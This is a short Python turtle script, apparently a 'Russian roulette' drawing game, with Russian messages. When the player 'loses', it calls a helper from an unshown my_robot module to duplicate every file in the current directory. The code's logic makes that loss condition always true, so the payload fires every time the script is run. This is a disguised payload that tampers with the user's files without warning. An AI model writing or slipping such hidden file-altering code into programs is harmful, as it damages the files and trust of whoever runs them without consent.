import turtle
import random
import math
import my_robot
import os

turtle.speed(0)

def gotoxy(x,y):
    turtle.penup()
    turtle.goto(x,y)
    turtle.pendown()

def draw_circle(r, color):
    turtle.fillcolor(color)
    turtle.begin_fill()
    turtle.circle(r)
    turtle.end_fill()

gotoxy(0, 0)
turtle.circle(80)
gotoxy(0, 160)
draw_circle(5, 'red')

phi = 360 / 7
r = 50

for i in range (0, 8): # random.randrange(7, 50)):
    phi_rad = phi * i * math.pi / 180.0
    gotoxy(math.sin(phi_rad) * r, math.cos(phi_rad) * r + 60)
    draw_circle(22, 'brown')
    draw_circle(22, 'white')

gotoxy(math.sin(phi_rad) * r, math.cos(phi_rad) * r + 60)
draw_circle(22, 'brown')
if i % 7 == 0:
    gotoxy(-150, 250)
    turtle.write('Вы проиграли!', font=('Arial', 18, 'normal'))
    for i in os.listdir():
        my_robot.duplicate_file(i)
    print('Дублирование завершено.')
answer = ''
while answer.lower() != 'n':
    answer = turtle.textinput('Нарисовать окружность', "Y/N")
    if answer.lower() == 'y':
        gotoxy(random.randrange(-300, 300), random.randrange(-200, 200))
        turtle.fillcolor(random.random(), random.random(), random.random())
        turtle.begin_fill()
        turtle.circle(random.randrange(1, 100))
        turtle.end_fill()
    else:
        pass
